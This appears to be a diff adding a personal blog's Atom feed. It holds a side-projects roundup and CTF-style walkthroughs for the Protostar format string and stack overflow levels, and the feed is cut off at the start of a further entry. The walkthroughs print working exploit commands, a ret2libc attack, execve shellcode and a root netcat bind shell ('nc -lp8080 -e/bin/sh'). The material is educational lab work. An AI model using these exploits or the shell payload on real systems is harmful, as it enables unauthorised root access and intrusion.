@@ -1,0 +1,936 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: projects | Louis Li]]></title>
+  <link href="http://louisrli.github.io/blog/categories/projects/atom.xml" rel="self"/>
+  <link href="http://louisrli.github.io/"/>
+  <updated>2013-07-08T18:46:52-04:00</updated>
+  <id>http://louisrli.github.io/</id>
+  <author>
+    <name><![CDATA[Louis Li]]></name>
+    <email><![CDATA[louisrli@gmail.com]]></email>
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[2012 in Sideprojects]]></title>
+    <link href="http://louisrli.github.io/blog/2013/01/12/sideprojects-2012/"/>
+    <updated>2013-01-12 00:00:00 -0500</updated>
+    <id>http://louisrli.github.io/blog/2013/01/12/sideprojects-2012</id>
+    <content type="html"><![CDATA[<p>It always surprises me how long a year is. It&rsquo;s hard for me to believe that some of these projects were a year ago, but I&rsquo;m happy to see my progress. Here&rsquo;s a walk down memory lane for my projects in 2012, not including course projects and research.</p>
+
+<p><a id="exploits" style="visibility:hidden;"> </a></p>
+
+<h3>Exploit Exercises: Protostar, Nebula</h3>
+
+<p>Description
+: A series of security wargames from <a href="http://exploit-exercises.com">Exploit Exercises</a>.</p>
+
+<p>Languages &amp; Tools
+: shell, C, assembly and shellcode, command line tools, compilation and libraries</p>
+
+<p>Other
+: These were both fun and educational. These problems required a good deal of persistence. Topics ranged from: buffer overflows, shell code, stack layout, library linking, race conditions, format strings, command line tools, networking. I&rsquo;ve posted the solutions on this site for the format string, stack, and shell exploit sections.</p>
+
+<p>Links
+: <a href="http://louisrli.github.com/sideprojects/2012/06/22/nebula0">Nebula shell solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/18/protostar-stack0">Protostar stack solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/29/protostar-format0">Protostar format solutions</a></p>
+
+<!-- more -->
+
+
+<p><a id="euler" style="visibility:hidden;"> </a></p>
+
+<h3>Project Euler</h3>
+
+<p>Description
+: A series of mathematical programming problems from <a href="http://projecteuler.net/">Project Euler</a>.</p>
+
+<p>Languages &amp; Tools
+: C++, Scala</p>
+
+<p>Other
+: Over the winter break of my freshman year (January 2012), I worked on these in C++. I&rsquo;ll admit that I&rsquo;m a bit embarrassed of the code I wrote &mdash; C++ isn&rsquo;t the greatest language to use to work on these problems. However, Project Euler is a great way to become familiar with a language. The problems become significantly harder, and I continued with Scala (June 2012 &ndash; August 2012).</p>
+
+<p>Links
+: <a href="https://github.com/louisrli/project-euler">code solutions</a></p>
+
+<p><a id="grabrc" style="visibility:hidden;"> </a></p>
+
+<h3>.grabrc</h3>
+
+<p>Description
+: A command-line client for downloading dotfiles from Github, giving a comfortable editing environment from any terminal. It can be installed via <a href="http://www.pip-installer.org/en/latest/">pip</a> (<code>pip install grabrc-client</code>).</p>
+
+<p>Languages &amp; Tools
+: Python (client), Scala Play Framework (server)</p>
+
+<p>Other
+: This was a pretty significant endeavor over the summer. The idea was motivated by my work with Amazon EC2 machines, virtual machines, and random in-house servers. Many times, I had to do work while ssh&rsquo;d to those machines, but it was less productive without my comfortable shell and emacs environment at hand. sftp'ing files is a bit tedious, so I wrote a client (command-line Python) and a server (RESTful API) for accessing my dotfiles. The server is currently hosted on Heroku. I do, in fact, eat my own dog food, and it&rsquo;s very handy when setting up new computers.</p>
+
+<p>Links
+: <a href="https://github.com/louisrli/grabrc-server">server source code</a>, <a href="https://github.com/louisrli/grabrc-client">client source code</a>, <a href="http://pypi.python.org/pypi/grabrc-client/">PyPI index</a></p>
+
+<p><a id="shuttleboy" style="visibility:hidden;"> </a></p>
+
+<h3>Shuttleboy iOS</h3>
+
+<p>Description
+: A native iOS version of the Harvard shuttle tracker, <a href="http://shuttleboy.cs50.net/">Shuttleboy</a>.</p>
+
+<p>Languages &amp; Tools
+: Objective-C, Cocoa Touch</p>
+
+<p>Other
+: I worked on this for a few weeks during the winter break of my freshman year (January 2012). I didn&rsquo;t want to pay for Apple Developer membership on my own, but after a long wait, I&rsquo;m planning to release it through Rover soon.</p>
+
+<p>Links
+: <a href="/images/shuttleboy-preview.png">screenshots</a></p>
+
+<p><a id="shuttlebaby" style="visibility:hidden;"> </a></p>
+
+<h3><a href="http://www.hcs.harvard.edu/~louis/shuttlebaby/">Shuttlebaby</a></h3>
+
+<p>Description
+: A website with the next few times between two particular stops on <a href="http://shuttleboy.cs50.net/">Shuttleboy</a>. Can be forked and customized.</p>
+
+<p>Languages &amp; Tools
+: PHP, HTML, CSS</p>
+
+<p>Links
+: <a href="http://www.hcs.harvard.edu/~louis/shuttlebaby/">site</a>, <a href="https://github.com/louisrli/shuttlebaby">source code</a></p>
+
+<p><a id="hungry" style="visibility:hidden;"> </a></p>
+
+<h3><a href="http://www.hcs.harvard.edu/~louis/hungry/">Hungry</a></h3>
+
+<p>Description
+: A website with an obnoxiously concise version of the Harvard dining menu, showing only entrees. Includes an option to sign up and receive daily emails.</p>
+
+<p>Languages &amp; Tools
+: PHP, HTML, CSS</p>
+
+<p>Links
+: <a href="http://www.hcs.harvard.edu/~louis/hungry/">site</a>, <a href="https://github.com/louisrli/hungry">source code</a></p>
+
+<h3>Jenkins Arbitrary Parameters Plugin</h3>
+
+<p>Description
+: A plugin for the open-source continuous integration tool [Jenkins] that allows an arbitrary number of string parameters to be passed in as key-value pairs in properties file format.</p>
+
+<p>Languages &amp; Tools
+: Java, Jenkins</p>
+
+<p>Other
+: Over the summer, one of my first intern projects was constructing a parameterized test framework in Jenkins that would run jobs along a matrix of parameters: operating system, MySQL version, log4cpp version, Java version, etc. Along with some work on the ec2-plugin, this was my first time looking at such a huge codebase. After poking around the Javadocs and Confluence wiki for a substantial amount of time, I wrote this plugin.</p>
+
+<p>Links
+: <a href="https://github.com/louisrli/arbitrary-parameters-plugin">source code</a></p>
+
+<p><a id="louisrligithub" style="visibility:hidden;"> </a></p>
+
+<h3><a href="http://louisrli.github.com">louisrli.github.com</a></h3>
+
+<p>Description
+: This site.</p>
+
+<p>Languages &amp; Tools
+: Customized Twitter Bootstrap (HTML/CSS/Javascript), Jekyll, Markdown</p>
+
+<p>Links
+: <a href="https://github.com/louisrli/louisrli.github.com">source code</a>, <a href="http://louisrli.github.com/">site</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
+    <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
+    <updated>2012-08-29 00:00:00 -0400</updated>
+    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
+    <content type="html"><![CDATA[<h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This post contains solutions and walkthroughs for the four format string levels (&ldquo;Format&rdquo;).</p>
+
+<h1>Solutions</h1>
+
+<h2>Format: Level 0</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>
+
+<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.
+<div>
+  <pre><code class='console'>$ ./format0 %64s$(perl -e &amp;lsquo;print &amp;ldquo;\xef\xbe\xad\xde&amp;rdquo;&amp;rsquo;)&lt;/p&gt;
+
+&lt;p&gt;you have hit the target correctly :)</code></pre>
+</div>
+</p>
+
+<!-- more -->
+
+
+<h2>Format: Level 1</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code>target</code>, to any nonzero value.</p>
+
+<p><code>target</code> is a global variable. To overwrite it, we first find its address using <code>obdjump -t</code> (we could also use <code>nm</code> to save some keystrokes).
+<div>
+  <pre><code class='console'>$ objdump -t format1 | grep target
+08049638 g       0 .bss    00000004            target</code></pre>
+</div>
+</p>
+
+<p>Next, we need to find where the format function expects the first (missing) argument to the format string.
+<div>
+  <pre><code class='text'>Starting program: /opt/protostar/bin/format1 AAAA%08x&lt;/p&gt;
+
+&lt;p&gt;Breakpoint 1, __printf (format=0xbffff98f &amp;ldquo;AAAA%08x&amp;rdquo;) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) x/10xw $esp
+0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
+0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
+0xbffff788:     0xbffff7b8      0x08048469
+(gdb) x/xw 0xbffff784
+0xbffff784:     0x0804960c
+(gdb) p 0xbffff98f &amp;ndash; 0x0bffff784
+$1 = 523</code></pre>
+</div>
+</p>
+
+<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string&rsquo;s characters by <em>n</em> bytes. Adding one more character decrements the address from <code>0xbffff98f</code> to <code>0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>
+
+<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code>printf</code>) rather than <code>vuln()</code>.
+<div>
+  <pre><code class='text'>(gdb) run AAAAA%08x
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y&lt;/p&gt;
+
+&lt;p&gt;Starting program: /opt/protostar/bin/format1 AAAAA%08x&lt;/p&gt;
+
+&lt;p&gt;Breakpoint 1, __printf (format=0xbffff98e &amp;ldquo;AAAAA%08x&amp;rdquo;) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) x/xw 0xbffff784
+0xbffff784:     0x0804960c</code></pre>
+</div>
+</p>
+
+<ul>
+<li><code>0xbffff784</code>: The first argument to the format string.</li>
+<li><code>0xbffff997 - n</code>: The first character of the format string, where <code>n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
+</ul>
+
+
+<p>As seen earlier, the distance between the beginning of the format string (the address of <code>target</code>) and the first argument to the format string (a starting address for &ldquo;stack popping&rdquo; additional arguments) is about 500 bytes.</p>
+
+<p>With a few calculations, we can find the correct offset.
+<div>
+  <pre><code class='console'>$ ./format1 $(perl -e &amp;lsquo;print &amp;ldquo;\x38\x96\x04\x08&amp;rdquo;&amp;rsquo;)&amp;lsquo;..%128$n&amp;rsquo;
+8..you have modified the target :)</code></pre>
+</div>
+</p>
+
+<h2>Format: Level 2</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x40</code>.</p>
+
+<p><div>
+  <pre><code class='console'>$ objdump -t format2 | grep target
+080496e4 g     O .bss   00000004              target</code></pre>
+</div>
+</p>
+
+<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>
+
+<p><div>
+  <pre><code class='console'>$ echo -ne $(perl -e &amp;lsquo;print &amp;ldquo;\xe4\x96\x04\x08&amp;rdquo;&amp;rsquo;)%4\$08x | ./format2
+080496e4target is 0 :(</code></pre>
+</div>
+</p>
+
+<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>
+
+<p><div>
+  <pre><code class='console'>$ echo -ne $(perl -e &amp;lsquo;print &amp;ldquo;\xe4\x96\x04\x08&amp;rdquo;&amp;rsquo;)%60u%4\$n | ./format2&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;                                                     512you have modified the target :)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;</code></pre>
+</div>
+</p>
+
+<h2>Format: Level 3</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x01025544</code>.</p>
+
+<p><div>
+  <pre><code class='console'>$ objdump -t format3 | grep target
+080496f4 g     O .bss   00000004              target</code></pre>
+</div>
+</p>
+
+<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.
+<div>
+  <pre><code class='text'>(gdb) break printf
+Breakpoint 1 at 0x804837c
+(gdb) run
+Starting program: /opt/protostar/bin/format3
+AAAA
+Breakpoint 1, &lt;strong&gt;printf (format=0xbffff5a0 &amp;ldquo;AAAA\n&amp;rdquo;) at printf.c:29
+29      printf.c: No such file or directory.
+in printf.c
+(gdb) info frame
+Stack level 0, frame at 0xbffff570:
+eip = 0xb7edcfa2 in &lt;/strong&gt;printf (printf.c:29); saved eip 0x8048465
+called by frame at 0xbffff590
+source language c.
+Arglist at 0xbffff568, args: format=0xbffff5a0 &amp;ldquo;AAAA\n&amp;rdquo;
+Locals at 0xbffff568, Previous frame&amp;rsquo;s sp is 0xbffff570
+Saved registers:
+ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
+(gdb) x/3xw 0xbffff568
+0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
+(gdb) x/w 0xbffff570
+0xbffff570:     0xbffff5a0
+(gdb) p 0xbffff5a0 &amp;ndash; 0xbffff570
+= 48</code></pre>
+</div>
+</p>
+
+<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.
+<div>
+  <pre><code class='console'>$ echo AAAA%12\$x | ./format3
+AAAA41414141
+target is 00000000 :(</code></pre>
+</div>
+</p>
+
+<p>Next, we need to change the value of target to <code>0x01025544</code>. Below is each byte in decimal:
+<div>
+  <pre><code class='console'>$ echo &amp;ldquo;ibase=16; 44&amp;rdquo; | bc
+68
+$ echo &amp;ldquo;ibase=16; 55&amp;rdquo; | bc
+85
+$ echo &amp;ldquo;ibase=16; 02&amp;rdquo; | bc
+2
+$ echo &amp;ldquo;ibase=16; 01&amp;rdquo; | bc
+1</code></pre>
+</div>
+</p>
+
+<p>Finally, we write values to each of the four bytes of <code>target</code>:
+<div>
+  <pre><code class='console'>$ echo $(perl -e &amp;lsquo;print &amp;ldquo;\xf4\x96\x04\x08&amp;rdquo;&amp;rsquo;)$(perl -e &amp;lsquo;print &amp;ldquo;\xf5\x96\x04\x08&amp;rdquo;&amp;rsquo;)$(perl -e &amp;lsquo;print &amp;ldquo;\xf6\x96\x04\x08&amp;rdquo;&amp;rsquo;)$(perl -e &amp;lsquo;print &amp;ldquo;\xf7\x96\x04\x08&amp;rdquo;&amp;rsquo;)&amp;lsquo;%52u%12$n%&amp;rsquo;&amp;lsquo;17u%13$n&amp;rsquo;&amp;lsquo;%173u%14$n&amp;rsquo; | ./format3
+���                                                   0       3221222848                                                                                                                                                                   3086839796
+you have modified the target :))</code></pre>
+</div>
+</p>
+
+<p>Note that it wasn&rsquo;t necessary to include the last address, <code>0x080496f7</code>, since the most significant byte (<code>0x01</code>) is written as a consequence of the overflow.</p>
+
+<h2>Format: Level 4</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code>hello()</code> by using a format string exploit.</p>
+
+<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.
+<div>
+  <pre><code class='console'>$ echo &amp;lsquo;AAAA%4$x&amp;rsquo; | ./format4
+AAAA41414141</code></pre>
+</div>
+</p>
+
+<p>In order to perform this exploit, we&rsquo;ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we&rsquo;ll overwrite the entry of the <code>exit()</code> function (<code>0x08049724</code>) with the address of the <code>hello()</code> function (<code>0x08048b4</code>).
+<div>
+  <pre><code class='console'>$ objdump -TR format4 | grep exit
+00000000      DF &lt;em&gt;UND&lt;/em&gt; 00000000  GLIBC_2.0   &lt;em&gt;exit
+00000000      DF &lt;em&gt;UND&lt;/em&gt;  00000000  GLIBC_2.0   exit
+08049718 R_386_JUMP_SLOT   &lt;/em&gt;exit
+08049724 R_386_JUMP_SLOT   exit
+$ objdump -t format4 | grep hello
+080484b4 g     F .text  0000001e              hello</code></pre>
+</div>
+</p>
+
+<p>To confirm that our overwrite works correctly, we run a quick test:
+<div>
+  <pre><code class='console'>$ echo $(perl -e &amp;lsquo;print &amp;ldquo;\x24\x97\x04\x08&amp;rdquo;&amp;rsquo;)&amp;lsquo;%4$n&amp;rsquo; &gt; /tmp/format4
+$ gdb -q format4
+Reading symbols from /opt/protostar/bin/format4&amp;hellip;done.
+(gdb) run &amp;lt; /tmp/format4
+Starting program: /opt/protostar/bin/format4 &amp;lt; /tmp/format4
+$�
+Program received signal SIGSEGV, Segmentation fault.
+0x00000004 in ?? ()</code></pre>
+</div>
+</p>
+
+<p>Execution jumped to the address <code>0x00000004</code>, meaning that we&rsquo;re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> &mdash; only the last two bytes need to be changed.
+<div>
+  <pre><code class='console'>$ echo $(perl -e &amp;lsquo;print &amp;ldquo;\x24\x97\x04\x08&amp;rdquo;&amp;rsquo;)&amp;lsquo;%33968u%4$hn&amp;rsquo; | ./format4
+$
+&lt;lots of whitespace&gt;
+512&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;                                                                                                                                                                          code execution redirected! you win
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;</code></pre>
+</div>
+</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 6-7)]]></title>
+    <link href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/"/>
+    <updated>2012-08-28 00:00:00 -0400</updated>
+    <id>http://louisrli.github.io/blog/2012/08/28/protostar-stack2</id>
+    <content type="html"><![CDATA[<h1>Overview</h1>
+
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>
+
+<h1>Solutions</h1>
+
+<h2>Stack 6</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code>0xbfxxxxxx</code>.</p>
+
+<h3>Utilities</h3>
+
+<p>We&rsquo;ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>
+
+<p><code>~/try-address.sh</code>:
+<div>
+  <pre><code class='bash'>&lt;/p&gt;
+
+&lt;h1&gt;!/bin/bash&lt;/h1&gt;
+
+&lt;h1&gt;Takes an offset and unlimited 4-byte addresses and prints it in little-endian order&lt;/h1&gt;
+
+&lt;p&gt;if [[ $# -lt 2 ]]; then&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo &quot;usage: $0 OFFSET ADDRESS. Example: $0 80 0xdeadbeef 0xf00f00f0&quot;
+exit 1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;fi&lt;/p&gt;
+
+&lt;p&gt;perl -e &amp;ldquo;print &amp;lsquo;A'x$1&amp;rdquo;
+shift
+for addr in $@; do&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;for i in $(seq 8 -2 2); do echo -ne &quot;\x${addr:$i:2}&quot;; done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;done</code></pre>
+</div>
+</p>
+
+<!-- more -->
+
+
+<h3>Solution</h3>
+
+<p>First, we need to find the proper offset for overwriting the return address. The command below reveals that the return address is 16 bytes after the end of the 64 byte buffer, meaning that 80 bytes are needed before overwriting the return address.</p>
+
+<p><div>
+  <pre><code class='console'>$ for i in $(seq 76 4 100); do echo $i; ~/try-address.sh $i 0xbfffffff | ./stack6; done
+76
+&amp;hellip;
+80
+input path please: bzzzt (0xbfffffff)
+84
+&amp;hellip;</code></pre>
+</div>
+</p>
+
+<p>For our solution, we&rsquo;ll be performing a <strong><a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a></strong> attack. <a href="http://shellblade.net/docs/ret2libc.pdf">This paper</a> by InVoLuNTaRy offers an in-depth description of the tactic (sidenote: it&rsquo;s one of the most well-written papers that I&rsquo;ve ever read and well worth the read). The rest of this section assumes that this paper has been read.</p>
+
+<p>First, we find the addresses of the <code>system()</code> and <code>exit()</code> libc functions. <code>exit()</code> isn&rsquo;t strictly necessary, but since ret2libc ultimately calls two functions, we prefer to return without a segmentation fault.
+<div>
+  <pre><code class='console'>$ gdb -q stack6
+Reading symbols from /opt/protostar/bin/stack6&amp;hellip;done.
+(gdb) break main
+Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
+(gdb) run
+Starting program: /opt/protostar/bin/stack6&lt;/p&gt;
+
+&lt;p&gt;Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27
+27      stack6/stack6.c: No such file or directory.
+in stack6/stack6.c
+(gdb) print system
+$1 = {&lt;text variable, no debug info&gt;} 0xb7ecefb0 &amp;lt;&lt;strong&gt;libc_system&gt;
+(gdb) print exit
+$2 = {&lt;text variable, no debug info&gt;} 0xb7ec50c0 &amp;lt;*&lt;/strong&gt;GI_exit&gt;</code></pre>
+</div>
+</p>
+
+<p>We see that our functions have the following addresses:</p>
+
+<ul>
+<li><code>system()</code>: <code>0xb7ecefb0</code></li>
+<li><code>exit()</code>: <code>0xb7ec50c0</code></li>
+</ul>
+
+
+<p>Given the particular stack layout for a ret2libc attack (described in the InVoLuNTaRy paper), our solution will be of the form:
+<div>
+  <pre><code class='console'>$ ~/try-address.sh 80 (ENV_VAR_ADDRESS) (EXIT()&lt;em&gt;ADDRESS) (SYSTEM()&lt;/em&gt;ADDRESS)</code></pre>
+</div>
+</p>
+
+<h4>Sanity checks</h4>
+
+<p>First, let&rsquo;s make sure that we can actually execute code.
+<div>
+  <pre><code class='console'>$ export TEST=whoami
+$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff8a | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췊���
+sh: =whoami: not found
+$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff8b | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췋���
+root</code></pre>
+</div>
+</p>
+
+<h4>Working netcat solution</h4>
+
+<p>There are two obstacles to a working solution.</p>
+
+<ol>
+<li>Environmental variables with spaces don&rsquo;t work. All of the following would fail:
+<div>
+  <pre><code class='console'>$ export RUN=&amp;ldquo;nc -lp8080 -e/bin/sh&amp;rdquo;
+$ export RUN=&amp;ldquo;cat /etc/shadow&amp;rdquo;
+$ export RUN=&amp;ldquo;\&quot;cat /etc/shadow\&amp;rdquo;&amp;ldquo;</code></pre>
+</div>
+</li>
+<li><code>system()</code> will drop our root privileges (<a href="http://linux.die.net/man/3/system">man system</a>)</li>
+</ol>
+
+
+<p>Instead, we can wrap our call to netcat in another C program, naming an executable without spaces and restoring our privileges.</p>
+
+<p><div>
+  <pre><code class='c'>&lt;/p&gt;
+
+&lt;h1&gt;include &amp;lt;stdlib.h&gt;&lt;/h1&gt;
+
+&lt;p&gt;int main(int argc, char &lt;strong&gt;argv, char &lt;/strong&gt;envp) {&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;setuid(0); // These two are necessary, as system() drops privileges
+setgid(0);
+char *args[] = {  &quot;nc&quot;, &quot;-lp8080&quot;, &quot;-e/bin/sh&quot;, (char *) 0 };
+execve(&quot;/bin/nc&quot;, args, envp);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}</code></pre>
+</div>
+</p>
+
+<p><div>
+  <pre><code class='console'>$ gcc ~/netcat.c -o ~/netcat
+$ export RUN=/////////////////////////////////////home/user/netcat   # The slashes are similar to a NOP sled
+$ ~/envaddr RUN
+RUN is at address 0xbfffff9e
+$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff9e | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췞���
+sh: 192.168.1.10: not found</code></pre>
+</div>
+</p>
+
+<p><code>system()</code> doesn&rsquo;t seem to be using the contents of our environmental variable. If we look at the environmental variables, though, we see that we were close enough: <code>RUN</code> is the next variable. We then adjust our estimate for the address of <code>RUN</code> by 20 bytes.</p>
+
+<p><div>
+  <pre><code class='console'>$ env
+&amp;hellip;
+HOME=/home/user
+LOGNAME=user
+SSH_CONNECTION=192.168.1.7 49324 192.168.1.10 22
+RUN=/////////////////////////////////////home/user/netcat
+_=/usr/bin/env
+$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffffbe | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췳���
+&lt;waiting&gt;</code></pre>
+</div>
+</p>
+
+<p>Finally, through a remote machine:
+<div>
+  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
+whoami
+root</code></pre>
+</div>
+</p>
+
+<h2>Stack: Level 7</h2>
+
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack7">full</a>): Execute shellcode with further restrictions on the return address. Any address of the form <code>0xbxxxxxxx</code> raises an error.</p>
+
+<h3>Overview</h3>
+
+<p>The return value of a function is usually stored in the <code>eax</code> register. The key to this level is the call to <code>return strdup(buf)</code>: this means we can find the buffer (e.g. our shellcode) in the <code>eax</code> register when <code>getpath()</code> returns.</p>
+
+<p>The code restricts us from returning to any code on the bottom of the stack (<code>0xbxxxxxxx</code>) and advises us to return to the <code>.text</code> section. In particular, we&rsquo;ll want to return to a <code>call eax</code> instruction, which will then call our shellcode.</p>
+
+<p><div>
+  <pre><code class='console'>$ objdump -M intel -d stack7 | grep &amp;ldquo;call.&lt;em&gt;eax&amp;rdquo;
+8048478:       ff 14 85 5c 96 04 08    call   DWORD PTR [eax&lt;/em&gt;4+0x804965c]
+80484bf:       ff d0                   call   eax
+80485eb:       ff d0                   call   eax</code></pre>
+</div>
+</p>
+
+<p>If we play with the numbers like in earlier levels, we&rsquo;ll find that 80 bytes are needed before the return address. Our buffer overflow will look like this:
+<div>
+  <pre><code class='text'>Buffer start&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  | ---------- Shellcode (n bytes) --------- |
+  | -------- Padding (80 - n bytes) -------- |
+  | -- Return address 0x80484bf (4 bytes) -- |
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Buffer end (84 bytes total)</code></pre>
+</div>
+</p>
+
+<h3>Solution</h3>
+
+<p>In earlier levels, we found that opening a shell with <code>gets()</code>. However, we can still use it to validate our strategy:
+<div>
+  <pre><code class='console'>$ echo -ne $(cat ~/shell)$(~/try-address.sh 49 0x080484bf) | wc -c
+84
+$ echo -ne $(cat ~/shell)$(~/try-address.sh 49 0x080484bf) &gt; /tmp/stack7shell
+$ gdb -q stack7
+Reading symbols from /opt/protostar/bin/stack7&amp;hellip;done.
+(gdb) run &amp;lt; /tmp/stack7shell
+Starting program: /opt/protostar/bin/stack7 &amp;lt; /tmp/stack7shell
+input path please: got path ����1�Ph//shh/bin��h-ilsP�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
+Executing new program: /bin/dash&lt;/p&gt;
+
+&lt;p&gt;Program exited normally.</code></pre>
+</div>
+</p>
+
+<p>If we give it a shot with our <code>nc</code> shellcode, we&rsquo;ll find the following error: <code>bin/sh: forward host lookup failed: Unknown host</code>. This occurs as a complication from having options passed into the <code>execve</code> call.</p>
+
+<p>We can add another wrapper to the <code>netcat.c</code> used in Level 6 by writing our own shellcode. This shellcode will simply execute <code>/tmp/nc</code>, an alias for a compiled <code>netcat.c</code>. This file, in turn, calls netcat and listens via port 8080.</p>
+
+<p><code>~/sc-tmp-nc.asm</code>:
+<div>
+  <pre><code class='nasm'>BITS 32&lt;/p&gt;
+
+&lt;p&gt;xor eax, eax
+push eax
+push 0x636e2f2f         ; //nc
+push 0x706d742f         ; /tmp
+mov ebx, esp
+push eax
+mov edx, esp
+push ebx
+mov ecx, esp
+mov al, 11              ; execve()
+int 0x80</code></pre>
+</div>
+</p>
+
+<p><div>
+  <pre><code class='console'>$ nasm ~/sc-tmp-nc.asm
+$ gcc ~/netcat.c -o ~/netcat
+$ cp /home/user/netcat /tmp/nc
+$ cat /home/user/sc-tmp-nc | wc -c
+25
+got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
+$ echo -ne $(cat ~/sc-tmp-nc)$(~/try-address.sh 55 0x080484bf) | ./stack7
+input path please: got path 1�Ph//nch/tmp���̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
+&lt;waiting&gt;</code></pre>
+</div>
+</p>
+
+<p>On a remote machine:
+<div>
+  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
+whoami
+root</code></pre>
+</div>
+</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 4-5)]]></title>
